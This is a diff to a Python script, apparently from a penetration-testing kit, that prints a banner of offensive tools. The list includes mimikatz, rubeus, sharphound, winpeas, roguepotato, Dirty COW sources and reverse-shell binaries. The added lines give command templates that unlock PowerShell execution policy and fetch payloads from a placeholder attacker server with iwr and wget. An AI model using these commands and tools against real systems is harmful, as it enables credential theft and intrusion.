@@ -112,6 +112,9 @@ with open("banner1.txt", "w") as banner:
    
    banner.write("ENUMERATION\t\tSHELLS\t\t\tRUNNING PROCESSES\t\tCOMMUNICATIONS\t\t\tCORE EXPLOITS       \n")
    banner.write("---------------------------------------------------------------------------------------------------------------------------------------------------------\n")
+   banner.write("Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted                    \n")
+   banner.write("powershell 'iwr -Uri http://IP:PORT/TREADSTONE/filename' -outfile filename              \n")
+   banner.write("---------------------------------------------------------------------------------------------------------------------------------------------------------\n")
    banner.write("jawsenum.ps1\t\twinshell32.exe\t\tpowerup.ps1\t\t\tnc64.exe\t\t\tmimidump.ps1           \n")
    banner.write("sharphound.ps1\t\twinshell64.exe\t\tpowercat.ps\t\t\tplink64.exe\t\t\tmimikatz.ps1      \n")
    banner.write("sharphound.exe\t\twebshell.php\t\tpowerview.ps1\t\t\twin_chisel64.exe\t\twinpwn.ps1     \n")
@@ -119,6 +122,8 @@ with open("banner1.txt", "w") as banner:
    banner.write("winpeas64.exe\t\t\t\t\tprocdump32.exe\t\t\ttest_clsid.bat\t\t\troguepotato.exe          \n")
    banner.write("rubeus.exe\t\t\t\t\tprocdump64.exe\t\t\trogueoxidresolver.exet\t\tmimikatz64.exe        \n")
    banner.write("nmapsetup.exe\t\t\t\t\t\t\t\t\t\t\t\t\tmimikatz32.exe                                   \n")
+   banner.write("---------------------------------------------------------------------------------------------------------------------------------------------------------\n")
+   banner.write("wget 'http://IP:PORT/TREADSTONE/fileame                                                 \n")
    banner.write("---------------------------------------------------------------------------------------------------------------------------------------------------------\n")
    banner.write("coffee.sh\t\tlinshell32.elf\t\tpspy32\t\t\t\tlin_chisel64\t\t\tnaughtycowcompile.sh     \n")
    banner.write("linpeas.sh\t\tlineshell64.elf\t\tpspy64\t\t\t\tlin_chisel32\t\t\tnaughycow.c            \n")
